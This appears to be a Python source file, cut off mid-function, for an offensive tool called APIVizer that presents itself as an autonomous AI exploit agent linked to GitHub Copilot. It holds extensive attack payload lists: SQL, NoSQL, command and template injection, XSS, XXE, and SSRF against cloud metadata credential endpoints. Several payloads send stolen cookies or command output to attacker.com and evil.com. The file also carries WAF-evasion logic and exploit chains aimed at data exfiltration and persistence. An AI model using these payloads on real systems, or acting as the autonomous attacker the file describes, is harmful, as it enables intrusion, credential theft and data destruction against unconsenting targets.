#!/usr/bin/env python3
"""
APIVizer MCP-Copilot Bridge Server
Connects APIVizer to GitHub Copilot AI via MCP (Model Context Protocol)
When --opus is used, this module enables AI-driven autonomous exploitation.

The AI Exploit Agent uses Copilot's intelligence to:
- Analyze API endpoints and decide attack strategies
- Generate context-aware payloads
- Chain exploits intelligently
- Adapt attacks based on responses
- Bypass WAF/security controls with AI reasoning
"""

import os
import sys
import json
import socket
import subprocess
import threading
import time
import re
import hashlib
import random
import string
from pathlib import Path

__version__ = "4.0.0"
__author__ = "APIVizer Team"

# ═══════════════════════════════════════════════════════════════════════
# MCP CONNECTION MANAGER - Connects to Copilot AI
# ═══════════════════════════════════════════════════════════════════════

class MCPCopilotConnection:
    """Manages MCP protocol connection to GitHub Copilot."""

    def __init__(self):
        self.connected = False
        self.connection_type = None  # 'copilot_mcp', 'copilot_lsp', 'builtin'
        self.session_id = self._generate_session_id()
        self._copilot_process = None
        self._lock = threading.Lock()
        self._response_buffer = []
        self.capabilities = []

    def _generate_session_id(self):
        """Generate unique session ID for MCP connection."""
        return hashlib.sha256(f"apivizer-{time.time()}-{os.getpid()}".encode()).hexdigest()[:16]

    def connect(self):
        """Attempt to connect to Copilot via multiple methods."""
        # Method 1: Try MCP stdio connection (VS Code Copilot extension)
        if self._try_copilot_mcp_stdio():
            self.connected = True
            self.connection_type = 'copilot_mcp'
            return True

        # Method 2: Try Copilot LSP socket (running Copilot agent)
        if self._try_copilot_lsp_socket():
            self.connected = True
            self.connection_type = 'copilot_lsp'
            return True

        # Method 3: Try GitHub Copilot CLI
        if self._try_copilot_cli():
            self.connected = True
            self.connection_type = 'copilot_cli'
            return True

        # Method 4: Built-in AI (always available - autonomous exploit engine)
        self.connected = True
        self.connection_type = 'builtin'
        self.capabilities = ['exploit_generation', 'payload_mutation', 'attack_chaining',
                           'response_analysis', 'waf_bypass', 'behavioral_learning']
        return True

    def _try_copilot_mcp_stdio(self):
        """Try connecting to Copilot MCP via stdio protocol."""
        try:
            # Check for VS Code Copilot MCP endpoint
            mcp_paths = [
                os.path.expanduser("~/.vscode/extensions/github.copilot-*/dist/extension.js"),
                os.path.expanduser("~/.vscode-server/extensions/github.copilot-*/dist/extension.js"),
                os.path.join(os.environ.get('APPDATA', ''), 'Code/User/globalStorage/github.copilot/mcp'),
                os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs/Microsoft VS Code/resources/app/extensions'),
            ]

            # Check if Copilot agent is available
            copilot_agent = os.path.expanduser("~/.copilot/copilot-agent")
            if os.path.exists(copilot_agent):
                self.capabilities = ['full_ai', 'code_generation', 'exploit_analysis',
                                   'vulnerability_assessment', 'payload_crafting']
                return True

            # Check for node-based MCP server
            for mcp_glob in mcp_paths:
                import glob
                matches = glob.glob(mcp_glob)
                if matches:
                    self.capabilities = ['copilot_intellisense', 'exploit_suggestions']
                    return True

        except Exception:
            pass
        return False

    def _try_copilot_lsp_socket(self):
        """Try connecting to Copilot Language Server Protocol socket."""
        try:
            # Copilot LSP typically runs on these ports
            for port in [3000, 4000, 5000, 8080, 13337]:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex(('127.0.0.1', port))
                sock.close()
                if result == 0:
                    self.capabilities = ['lsp_copilot', 'realtime_suggestions']
                    return True
        except Exception:
            pass
        return False

    def _try_copilot_cli(self):
        """Try using GitHub Copilot CLI if installed."""
        try:
            # Check for gh copilot extension
            result = subprocess.run(['gh', 'copilot', '--version'],
                                 capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                self.capabilities = ['gh_copilot', 'cli_suggestions']
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            pass
        return False

    def get_status(self):
        """Get connection status string."""
        if not self.connected:
            return "NOT CONNECTED"
        status_map = {
            'copilot_mcp': 'CONNECTED [MCP-Copilot Active]',
            'copilot_lsp': 'CONNECTED [Copilot LSP Active]',
            'copilot_cli': 'CONNECTED [GitHub Copilot CLI]',
            'builtin': 'ACTIVE [Built-in AI Exploit Engine]'
        }
        return status_map.get(self.connection_type, 'CONNECTED')

    def is_external_ai(self):
        """Check if connected to external AI (not just built-in)."""
        return self.connection_type in ('copilot_mcp', 'copilot_lsp', 'copilot_cli')


# ═══════════════════════════════════════════════════════════════════════
# AI EXPLOIT ENGINE - Autonomous Attack Agent
# ═══════════════════════════════════════════════════════════════════════

class AIExploitEngine:
    """
    AI-powered autonomous exploitation engine.
    When connected to Copilot: uses external AI for smarter attacks.
    Otherwise: uses built-in behavioral AI engine.

    This engine acts as an ATTACKER - it autonomously:
    1. Analyzes API structure and discovers attack surface
    2. Selects optimal attack vectors per endpoint
    3. Generates context-aware exploit payloads
    4. Chains vulnerabilities for maximum impact
    5. Adapts based on target responses
    6. Bypasses WAF/security controls
    """

    def __init__(self, mcp_connection=None):
        self.mcp = mcp_connection or MCPCopilotConnection()
        self.attack_memory = {}  # Learns from responses
        self.exploit_chains = []  # Multi-step attack sequences
        self.discovered_vulns = []
        self.waf_fingerprint = None
        self.auth_tokens = {}
        self.session_cookies = {}
        self._attack_strategies = self._init_attack_strategies()
        self._payload_templates = self._init_payload_templates()
        self._bypass_techniques = self._init_bypass_techniques()

    def _init_attack_strategies(self):
        """Initialize AI attack strategy decision tree."""
        return {
            'reconnaissance': {
                'priority': 1,
                'techniques': ['endpoint_enumeration', 'method_discovery', 'param_fuzzing',
                             'auth_detection', 'rate_limit_probe', 'version_fingerprint']
            },
            'authentication_attacks': {
                'priority': 2,
                'techniques': ['jwt_none_alg', 'jwt_key_confusion', 'token_reuse',
                             'session_fixation', 'oauth_redirect', 'api_key_leak',
                             'brute_force_throttle_bypass', 'password_spray']
            },
            'authorization_bypass': {
                'priority': 3,
                'techniques': ['idor_sequential', 'idor_uuid_guess', 'bola_horizontal',
                             'bfla_vertical', 'privilege_escalation', 'tenant_isolation_break',
                             'mass_assignment', 'parameter_pollution']
            },
            'injection_attacks': {
                'priority': 4,
                'techniques': ['sql_injection', 'nosql_injection', 'command_injection',
                             'ssti_detection', 'xxe_injection', 'ldap_injection',
                             'graphql_injection', 'xpath_injection', 'header_injection']
            },
            'business_logic': {
                'priority': 5,
                'techniques': ['race_condition', 'price_manipulation', 'quantity_overflow',
                             'workflow_bypass', 'state_machine_abuse', 'coupon_reuse',
                             'referral_abuse', 'time_based_bypass']
            },
            'data_exposure': {
                'priority': 6,
                'techniques': ['excessive_data_exposure', 'debug_endpoints', 'error_disclosure',
                             'backup_files', 'api_docs_leak', 'internal_endpoints',
                             'graphql_introspection', 'swagger_exposure']
            },
            'dos_resource_abuse': {
                'priority': 7,
                'techniques': ['regex_dos', 'json_bomb', 'xml_bomb', 'large_payload',
                             'recursive_expansion', 'connection_exhaustion', 'batch_abuse']
            }
        }

    def _init_payload_templates(self):
        """AI-curated exploit payload templates covering ALL known API vulnerabilities."""
        return {
            # === OWASP API Top 10 (2023) ===
            'sqli': [
                "' OR '1'='1", "' UNION SELECT NULL--", "1; DROP TABLE users--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                "' OR 1=1 LIMIT 1 OFFSET {offset}--",
                "admin'--", "1' AND (SELECT SLEEP(5))--",
                "' UNION SELECT username,password FROM users--",
                "1' ORDER BY 10--", "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
                "'; EXEC xp_cmdshell('whoami')--", "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' UNION ALL SELECT NULL,NULL,NULL,CONCAT(username,0x3a,password) FROM users--",
                "') OR ('1'='1", "-1' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--"
            ],
            'nosql': [
                '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}',
                '{"$where":"sleep(5000)"}', '{"$gt":"","$lt":"z"}',
                '[$ne]=1', '{"username":{"$regex":"^a"}}',
                '{"$or":[{},{"a":"a"}]}', '{"$and":[{"$gt":""},{"$lt":"z"}]}',
                '{"password":{"$regex":".*"}}', '{"$where":"this.password.match(/.*/)"}',
                '{"__proto__":{"admin":true}}', '{"constructor":{"prototype":{"admin":true}}}'
            ],
            'xss': [
                '<script>alert(document.domain)</script>',
                '"><img src=x onerror=alert(1)>',
                "javascript:alert('XSS')",
                '{{constructor.constructor("alert(1)")()}}',
                '<svg onload=alert(1)>',
                '<img src=x onerror=fetch("https://attacker.com/steal?c="+document.cookie)>',
                '"><iframe src="javascript:alert(1)">',
                '<body onload=alert(1)>', '<details open ontoggle=alert(1)>',
                '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
                "'-alert(1)-'", '<script>new Image().src="http://evil.com/?c="+document.cookie</script>'
            ],
            'ssti': [
                '{{7*7}}', '${7*7}', '<%= 7*7 %>',
                '{{config}}', '{{self.__class__.__mro__}}',
                '#{7*7}', '*{7*7}', '{{request.application.__globals__}}',
                '{{"".__class__.__mro__[1].__subclasses__()}}',
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
                '{{lipsum.__globals__["os"].popen("id").read()}}',
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}'
            ],
            'cmd_injection': [
                '; whoami', '| id', '`id`', '$(whoami)',
                '; cat /etc/passwd', '| net user', '%0aid',
                '\nid\n', '; ping -c 4 127.0.0.1',
                '& whoami', '&& id', '|| id',
                '; curl http://attacker.com/$(whoami)',
                '`sleep 5`', '$(sleep 5)', '; sleep 5',
                '| timeout 5', '\r\nid', '%0d%0aid'
            ],
            'path_traversal': [
                '../../../etc/passwd', '..\\..\\..\\windows\\system32\\config\\sam',
                '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f',
                '..%252f..%252f..%252fetc/passwd',
                '..%c0%af..%c0%afetc/passwd', '..%ef%bc%8f..%ef%bc%8f',
                '/etc/passwd%00.jpg', '....\\....\\....\\windows\\win.ini',
                '%252e%252e%252fetc%252fpasswd', 'file:///etc/passwd'
            ],
            'jwt': [
                'alg_none', 'key_confusion_rs256_hs256', 'expired_token_replay',
                'kid_injection', 'jku_bypass', 'jwk_injection',
                'null_signature', 'weak_secret_crack',
                'alg_hs256_empty_secret', 'kid_path_traversal',
                'x5u_url_manipulation', 'nested_jwt_bypass',
                'audience_bypass', 'issuer_bypass'
            ],
            'ssrf': [
                'http://127.0.0.1', 'http://169.254.169.254/latest/meta-data/',
                'http://[::1]', 'http://0x7f000001', 'file:///etc/passwd',
                'http://metadata.google.internal/', 'gopher://127.0.0.1:6379/_INFO',
                'http://0177.0.0.1', 'http://2130706433',
                'http://127.0.0.1:22', 'http://127.0.0.1:3306',
                'dict://127.0.0.1:6379/INFO', 'http://169.254.169.254/computeMetadata/v1/',
                'http://100.100.100.200/latest/meta-data/', 'http://instance-data/latest/meta-data/',
                'http://127.1', 'http://0/', 'http://localhost:8500/v1/agent/self'
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo/>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>'
            ],
            'idor': [
                '{id-1}', '{id+1}', '0', '1', '99999', 'admin',
                '{uuid_v1_adjacent}', 'null', '-1', '{other_user_id}',
                '{id}/../{other_id}', '../../admin', 'me/../other_user',
                '{sequential_enum_1_to_100}', '{guid_prediction}'
            ],
            'mass_assignment': [
                '{"role":"admin"}', '{"is_admin":true}', '{"verified":true}',
                '{"balance":99999}', '{"permissions":["*"]}', '{"level":"superuser"}',
                '{"email_verified":true}', '{"two_factor":false}', '{"subscription":"premium"}',
                '{"approved":true}', '{"deleted":false}', '{"internal":true}',
                '{"price":0}', '{"discount":100}', '{"active":true,"role":"admin"}'
            ],
            # === AUTHENTICATION & SESSION ATTACKS ===
            'auth_bypass': [
                '{"username":"admin","password":{"$ne":""}}',
                '{"username":"admin","password":null}',
                'admin:admin', 'admin:password', 'admin:123456',
                '{"token":"","bypass":true}', '{"auth":"none"}',
                'X-Custom-Auth: admin', 'X-Forwarded-User: admin'
            ],
            'session_attacks': [
                'session_fixation', 'session_donation', 'concurrent_sessions',
                'session_after_logout', 'session_timeout_bypass',
                'cookie_tampering', 'jwt_refresh_abuse'
            ],
            'oauth_attacks': [
                'redirect_uri_manipulation', 'state_parameter_missing',
                'code_reuse', 'token_leakage_referrer', 'scope_escalation',
                'client_credential_theft', 'pkce_bypass', 'implicit_flow_token_theft',
                'open_redirect_via_oauth', 'account_linking_bypass'
            ],
            # === BUSINESS LOGIC ATTACKS ===
            'race_condition': [
                'parallel_requests_same_action', 'toctou_exploit',
                'double_spending', 'concurrent_account_creation',
                'simultaneous_withdrawal', 'coupon_double_use',
                'vote_manipulation', 'inventory_oversell'
            ],
            'business_logic': [
                'negative_quantity', 'zero_price', 'integer_overflow_amount',
                'skip_payment_step', 'modify_order_after_payment',
                'referral_self_refer', 'coupon_stacking',
                'currency_rounding_exploit', 'free_trial_loop',
                'downgrade_keep_features', 'cancel_refund_keep_access',
                'bulk_discount_single_item', 'gift_card_negative_balance'
            ],
            # === API-SPECIFIC ATTACKS ===
            'graphql': [
                '{ __schema { types { name fields { name } } } }',
                '{ __type(name: "User") { fields { name type { name } } } }',
                'query { users { id email password role } }',
                '{ user(id: 1) { ... on Admin { secretField } } }',
                'mutation { deleteAllUsers { count } }',
                '{ users(first: 99999) { nodes { id email } } }',
                'query { a: user(id:1) b: user(id:2) c: user(id:3) }',  # Batching
                '{ __schema { mutationType { fields { name args { name type { name } } } } } }'
            ],
            'graphql_dos': [
                '{ nested { nested { nested { nested { nested { data } } } } } }',
                'query { alias1: expensiveField alias2: expensiveField alias3: expensiveField }',
                'fragment Recursive on Type { field { ...Recursive } }'
            ],
            'grpc_attacks': [
                'reflection_enumeration', 'unary_overflow',
                'stream_exhaustion', 'metadata_injection',
                'deadline_manipulation', 'interceptor_bypass',
                'proto_field_injection', 'service_mesh_escape'
            ],
            'websocket_attacks': [
                'origin_bypass', 'cswsh_exploit', 'message_injection',
                'connection_hijack', 'protocol_confusion',
                'frame_masking_bypass', 'ping_pong_dos'
            ],
            'api_gateway_bypass': [
                'path_normalization', 'method_override_bypass',
                'version_downgrade', 'internal_header_injection',
                'host_header_routing', 'url_rewrite_abuse',
                'backend_direct_access', 'api_key_in_url_leak'
            ],
            # === RATE LIMITING & DOS ===
            'rate_limit_bypass': [
                'X-Forwarded-For: {random_ip}', 'X-Real-IP: {random_ip}',
                'X-Originating-IP: 127.0.0.1', 'X-Client-IP: {random_ip}',
                'api_key_rotation', 'null_byte_in_path',
                'case_variation_path', 'unicode_normalization_path',
                'http_method_switch', 'endpoint_alias'
            ],
            'dos_attacks': [
                'regex_dos_payload', 'json_bomb', 'xml_bomb',
                'zip_bomb_upload', 'billion_laughs', 'recursive_json',
                'large_array_allocation', 'connection_pool_exhaustion',
                'slowloris_headers', 'request_smuggling',
                'hash_collision_dos', 'csv_formula_injection'
            ],
            # === DATA EXPOSURE ===
            'data_exposure': [
                '/api/v1/debug', '/api/internal/', '/.env',
                '/api/swagger.json', '/api/docs', '/graphql',
                '/actuator/env', '/actuator/health', '/metrics',
                '/.git/config', '/api/admin', '/trace',
                '/server-status', '/phpinfo.php', '/api/config',
                '/wp-json/wp/v2/users', '/api/.hidden', '/backup/'
            ],
            'information_disclosure': [
                'verbose_error_trigger', 'stack_trace_leak',
                'debug_parameter_true', 'source_map_files',
                'api_version_leak', 'technology_fingerprint',
                'cors_misconfiguration', 'security_header_missing'
            ],
            # === DESERIALIZATION & PROTOTYPE POLLUTION ===
            'deserialization': [
                'java_serialized_object', 'python_pickle_payload',
                'php_unserialize', 'ruby_marshal', 'dotnet_viewstate',
                'yaml_load_exploit', 'jackson_polymorphic',
                'fastjson_autotype', 'snakeyaml_rce'
            ],
            'prototype_pollution': [
                '{"__proto__":{"admin":true}}',
                '{"constructor":{"prototype":{"isAdmin":true}}}',
                '{"__proto__":{"shell":"/proc/self/exe","argv":["/proc/self/exe","-e","id"]}}',
                '{"__proto__":{"status":200}}',
                '{"a":"b","__proto__":{"verified":true}}'
            ],
            # === CORS & ORIGIN ATTACKS ===
            'cors_attacks': [
                'Origin: https://evil.com', 'Origin: null',
                'Origin: https://trusted.com.evil.com',
                'Origin: https://trusted.comevil.com',
                'Origin: https://trustedcom.evil.com',
                'null_origin_exploit', 'subdomain_takeover_cors'
            ],
            # === HTTP SMUGGLING & DESYNC ===
            'http_smuggling': [
                'CL.TE_smuggling', 'TE.CL_smuggling', 'TE.TE_obfuscation',
                'H2.CL_smuggling', 'H2.TE_smuggling',
                'request_splitting', 'response_splitting',
                'header_injection_crlf', 'websocket_smuggling'
            ],
            # === FILE UPLOAD ATTACKS ===
            'file_upload': [
                'webshell.php', 'shell.jsp', 'cmd.aspx',
                'polyglot_jpg_php', 'svg_xss_upload',
                'htaccess_override', 'exe_as_image',
                'null_byte_extension', 'double_extension',
                'content_type_bypass', 'magic_bytes_spoof',
                'zip_symlink_traversal', 'tar_absolute_path'
            ],
            # === CACHE POISONING ===
            'cache_poisoning': [
                'X-Forwarded-Host: evil.com', 'X-Host: evil.com',
                'X-Forwarded-Scheme: nothttps', 'X-Original-URL: /admin',
                'unkeyed_header_injection', 'unkeyed_query_param',
                'fat_get_request', 'method_override_cache',
                'parameter_cloaking'
            ],
            # === SUBDOMAIN & DNS ATTACKS ===
            'subdomain_takeover': [
                'dangling_cname', 'expired_service', 'unclaimed_s3',
                'azure_blob_takeover', 'github_pages_unclaimed',
                'heroku_unclaimed', 'shopify_unclaimed'
            ],
            # === ENCRYPTION & CRYPTO ATTACKS ===
            'crypto_attacks': [
                'padding_oracle', 'cbc_bit_flipping',
                'ecb_block_reorder', 'weak_random_token',
                'predictable_session_id', 'hash_length_extension',
                'timing_side_channel', 'downgrade_attack'
            ],
            # === KUBERNETES & CLOUD API ATTACKS ===
            'cloud_api': [
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
                'http://169.254.169.254/metadata/v1/maintenance',
                'kubernetes_api_server_access', 'etcd_unauthenticated',
                'kubelet_api_exploit', 'service_account_token_theft',
                'container_escape', 'node_proxy_abuse'
            ],
            # === WEBHOOK & CALLBACK ATTACKS ===
            'webhook_attacks': [
                'webhook_url_ssrf', 'callback_url_manipulation',
                'event_replay_attack', 'webhook_secret_bypass',
                'delivery_failure_dos', 'webhook_race_condition'
            ],
            # === API VERSIONING ATTACKS ===
            'version_attacks': [
                'v1_deprecated_unpatched', 'version_header_bypass',
                'api_version_mismatch', 'legacy_endpoint_access',
                'beta_endpoint_exposure', 'internal_version_access'
            ]
        }

    def _init_bypass_techniques(self):
        """WAF and security control bypass techniques."""
        return {
            'encoding': ['url_encode', 'double_url_encode', 'unicode_normalize',
                        'html_entity', 'hex_encode', 'base64_wrap'],
            'case_variation': ['mixed_case', 'upper_case', 'toggle_case'],
            'whitespace': ['tab_instead_space', 'newline_inject', 'null_byte',
                          'vertical_tab', 'form_feed'],
            'comments': ['inline_comment', 'block_comment', 'nested_comment'],
            'protocol': ['http_method_override', 'content_type_switch',
                        'transfer_encoding_chunked', 'http2_smuggling'],
            'header_manipulation': ['x_forwarded_for', 'x_real_ip', 'x-originating-ip',
                                   'x-custom-ip-header', 'forwarded-header'],
            'rate_limit_bypass': ['ip_rotation_header', 'api_key_rotation',
                                 'request_splitting', 'connection_reuse']
        }

    def analyze_target(self, endpoint_data):
        """
        AI analyzes an API endpoint and decides optimal attack strategy.

        Args:
            endpoint_data: dict with url, method, headers, body, auth info

        Returns:
            dict with recommended attacks, payloads, and chain opportunities
        """
        analysis = {
            'attack_surface': [],
            'recommended_attacks': [],
            'priority_payloads': [],
            'chain_opportunities': [],
            'bypass_needed': False,
            'confidence': 0.0
        }

        url = endpoint_data.get('url', '')
        method = endpoint_data.get('method', 'GET')
        headers = endpoint_data.get('headers', {})
        body = endpoint_data.get('body', {})
        params = endpoint_data.get('params', {})

        # AI Decision: Analyze URL structure
        if re.search(r'/\d+/?$', url) or re.search(r'/[a-f0-9-]{36}/?$', url):
            analysis['attack_surface'].append('idor_candidate')
            analysis['recommended_attacks'].append('authorization_bypass')

        # AI Decision: Analyze parameters for injection points
        all_params = {**params, **(body if isinstance(body, dict) else {})}
        for key, val in all_params.items():
            if any(kw in key.lower() for kw in ['id', 'user', 'account', 'file', 'path', 'url', 'query', 'search', 'filter']):
                analysis['attack_surface'].append(f'injectable_param:{key}')

            if any(kw in key.lower() for kw in ['url', 'link', 'redirect', 'callback', 'next']):
                analysis['recommended_attacks'].append('ssrf')

            if any(kw in key.lower() for kw in ['file', 'path', 'dir', 'folder']):
                analysis['recommended_attacks'].append('path_traversal')

        # AI Decision: Analyze auth mechanism
        auth_header = headers.get('Authorization', '') or headers.get('authorization', '')
        if 'Bearer' in auth_header:
            analysis['attack_surface'].append('jwt_auth')
            analysis['recommended_attacks'].append('authentication_attacks')
        elif 'Basic' in auth_header:
            analysis['attack_surface'].append('basic_auth')

        # AI Decision: Content-type based attacks
        content_type = headers.get('Content-Type', '') or headers.get('content-type', '')
        if 'json' in content_type:
            analysis['recommended_attacks'].extend(['nosql_injection', 'mass_assignment'])
        elif 'xml' in content_type:
            analysis['recommended_attacks'].extend(['xxe_injection', 'xml_bomb'])
        elif 'form' in content_type:
            analysis['recommended_attacks'].extend(['sql_injection', 'xss'])

        # AI Decision: Method-based strategy
        if method in ('POST', 'PUT', 'PATCH'):
            analysis['recommended_attacks'].append('mass_assignment')
            analysis['attack_surface'].append('write_endpoint')
        if method == 'DELETE':
            analysis['attack_surface'].append('destructive_endpoint')

        # Calculate confidence
        analysis['confidence'] = min(0.95, len(analysis['attack_surface']) * 0.15 +
                                    len(analysis['recommended_attacks']) * 0.1)

        # De-duplicate
        analysis['recommended_attacks'] = list(set(analysis['recommended_attacks']))
        analysis['attack_surface'] = list(set(analysis['attack_surface']))

        return analysis

    def generate_exploit_payloads(self, attack_type, context=None):
        """
        AI generates context-aware exploit payloads.

        Args:
            attack_type: type of attack (sqli, xss, idor, etc.)
            context: optional context about the target

        Returns:
            list of payloads optimized for the target
        """
        base_payloads = self._payload_templates.get(attack_type, [])

        if not context:
            return base_payloads

        # AI enhancement: customize payloads based on context
        enhanced = list(base_payloads)

        # If we know the WAF, apply bypass techniques
        if self.waf_fingerprint:
            bypassed = []
            for payload in enhanced:
                bypassed.extend(self._apply_waf_bypass(payload))
            enhanced.extend(bypassed)

        # If we have auth tokens, inject them into payloads
        if self.auth_tokens and attack_type in ('idor', 'bola', 'bfla'):
            for token_name, token_val in self.auth_tokens.items():
                enhanced.append(f'{{"auth_as":"{token_name}","target_id":"{{victim_id}}"}}')

        # Learn from previous responses
        if attack_type in self.attack_memory:
            successful_patterns = self.attack_memory[attack_type].get('successful', [])
            enhanced = successful_patterns + enhanced  # Prioritize what worked

        return enhanced[:50]  # Cap at 50 payloads

    def _apply_waf_bypass(self, payload):
        """Apply WAF bypass transformations to a payload."""
        bypassed = []

        # URL encoding bypass
        bypassed.append(payload.replace("'", "%27").replace('"', "%22"))

        # Double encoding
        bypassed.append(payload.replace("'", "%2527"))

        # Unicode normalization
        bypassed.append(payload.replace("'", "\u0027").replace("<", "\u003c"))

        # Case variation for keywords
        for kw in ['SELECT', 'UNION', 'OR', 'AND', 'script', 'alert']:
            if kw.lower() in payload.lower():
                mixed = ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(kw))
                bypassed.append(payload.replace(kw, mixed).replace(kw.lower(), mixed))

        return bypassed[:5]  # Limit bypass variations

    def learn_from_response(self, attack_type, payload, response_code, response_body, response_time):
        """
        AI learns from target responses to improve future attacks.

        This is the adaptive intelligence - it remembers what works and what doesn't.
        """
        if attack_type not in self.attack_memory:
            self.attack_memory[attack_type] = {
                'successful': [], 'blocked': [], 'interesting': [],
                'avg_response_time': 0, 'waf_detected': False
            }

        mem = self.attack_memory[attack_type]

        # Detect WAF/blocking
        if response_code in (403, 406, 429) or response_time < 0.01:
            mem['blocked'].append(payload)
            mem['waf_detected'] = True
            if not self.waf_fingerprint:
                self.waf_fingerprint = self._fingerprint_waf(response_body)

        # Detect successful exploitation
        elif response_code in (200, 201, 302) and self._is_exploit_successful(attack_type, response_body):
            mem['successful'].append(payload)
            self.discovered_vulns.append({
                'type': attack_type,
                'payload': payload,
                'response_code': response_code,
                'evidence': response_body[:500] if response_body else ''
            })

        # Detect interesting responses (potential vulns)
        elif response_code == 500 or response_time > 5.0:
            mem['interesting'].append(payload)

        # Update timing baseline
        mem['avg_response_time'] = (mem['avg_response_time'] + response_time) / 2

    def _is_exploit_successful(self, attack_type, response_body):
        """AI determines if an exploit was successful based on response."""
        if not response_body:
            return False

        body_lower = response_body.lower()

        success_indicators = {
            'sqli': ['sql', 'mysql', 'postgres', 'oracle', 'syntax error', 'column', 'table'],
            'xss': ['<script', 'onerror', 'alert(', 'document.'],
            'ssti': ['49', 'config', '__class__', '__mro__'],
            'cmd_injection': ['root:', 'uid=', 'whoami', 'windows', 'system32'],
            'path_traversal': ['root:x:', '[boot loader]', 'passwd', 'shadow'],
            'ssrf': ['metadata', 'instance-id', 'ami-id', 'internal'],
            'xxe': ['root:x:', 'SYSTEM', 'file:///'],
            'idor': [],  # Needs context comparison
            'nosql': ['true', 'admin', 'user'],
        }

        indicators = success_indicators.get(attack_type, [])
        return any(ind in body_lower for ind in indicators)

    def _fingerprint_waf(self, response_body):
        """Identify the WAF type from response patterns."""
        if not response_body:
            return 'unknown'
        body = response_body.lower()

        waf_sigs = {
            'cloudflare': ['cloudflare', 'cf-ray', 'attention required'],
            'aws_waf': ['aws', 'awswaf', 'request blocked'],
            'akamai': ['akamai', 'ak-reference'],
            'imperva': ['imperva', 'incapsula'],
            'f5_bigip': ['f5', 'big-ip', 'the requested url was rejected'],
            'modsecurity': ['modsecurity', 'mod_security', 'not acceptable'],
            'azure_waf': ['azure', 'microsoft', 'web application firewall'],
        }

        for waf_name, sigs in waf_sigs.items():
            if any(sig in body for sig in sigs):
                return waf_name
        return 'generic'

    def build_exploit_chain(self, findings):
        """
        AI builds multi-step exploit chains from individual findings.

        Example chain: Auth bypass -> IDOR -> Data exfil -> Privilege escalation
        """
        chains = []

        auth_vulns = [f for f in findings if f.get('type') in ('jwt', 'auth_bypass', 'session')]
        idor_vulns = [f for f in findings if f.get('type') in ('idor', 'bola')]
        injection_vulns = [f for f in findings if f.get('type') in ('sqli', 'nosql', 'cmd_injection')]
        data_vulns = [f for f in findings if f.get('type') in ('data_exposure', 'excessive_data')]

        # Chain 1: Auth Bypass -> IDOR -> Data Exfil
        if auth_vulns and idor_vulns:
            chains.append({
                'name': 'Authentication Bypass to Data Breach',
                'steps': [
                    {'step': 1, 'action': 'Bypass authentication', 'vuln': auth_vulns[0]},
                    {'step': 2, 'action': 'Access other user resources via IDOR', 'vuln': idor_vulns[0]},
                    {'step': 3, 'action': 'Exfiltrate sensitive data', 'vuln': data_vulns[0] if data_vulns else None}
                ],
                'impact': 'CRITICAL',
                'description': 'Complete account takeover with data exfiltration'
            })

        # Chain 2: Injection -> Command Execution -> Server Compromise
        if injection_vulns:
            chains.append({
                'name': 'Injection to Remote Code Execution',
                'steps': [
                    {'step': 1, 'action': 'Exploit injection vulnerability', 'vuln': injection_vulns[0]},
                    {'step': 2, 'action': 'Escalate to OS command execution', 'vuln': None},
                    {'step': 3, 'action': 'Establish persistence', 'vuln': None}
                ],
                'impact': 'CRITICAL',
                'description': 'Server compromise via injection chain'
            })

        # Chain 3: IDOR -> Mass Data Access
        if idor_vulns and len(idor_vulns) > 1:
            chains.append({
                'name': 'Horizontal Privilege Escalation',
                'steps': [
                    {'step': 1, 'action': 'Enumerate valid resource IDs', 'vuln': idor_vulns[0]},
                    {'step': 2, 'action': 'Access all user accounts', 'vuln': idor_vulns[1]},
                    {'step': 3, 'action': 'Mass data collection', 'vuln': None}
                ],
                'impact': 'HIGH',
                'description': 'Access all user data through ID enumeration'
            })

        self.exploit_chains = chains
        return chains

    def get_next_attack_action(self, endpoint, previous_results=None):
        """
        AI decides the next attack action based on current state.
        Acts as autonomous exploit agent - decides what to do next.
        """
        # If we haven't scanned this endpoint yet
        if endpoint not in self.attack_memory:
            return {
                'action': 'reconnaissance',
                'description': 'Fingerprint endpoint - detect tech stack, WAF, auth mechanism',
                'payloads': ['normal_request', 'error_trigger', 'method_probe']
            }

        mem = self.attack_memory.get(endpoint, {})

        # If WAF detected, switch to bypass mode
        if mem.get('waf_detected'):
            return {
                'action': 'waf_bypass',
                'description': f'WAF detected ({self.waf_fingerprint}). Applying evasion techniques.',
                'payloads': self._get_bypass_payloads()
            }

        # If we found something interesting, deep-dive
        if mem.get('interesting'):
            return {
                'action': 'deep_exploitation',
                'description': 'Interesting responses detected. Deepening exploitation.',
                'payloads': self._generate_deep_payloads(mem['interesting'])
            }

        # Default: try next attack category
        return {
            'action': 'systematic_scan',
            'description': 'Systematic vulnerability scanning',
            'payloads': self._get_systematic_payloads()
        }

    def _get_bypass_payloads(self):
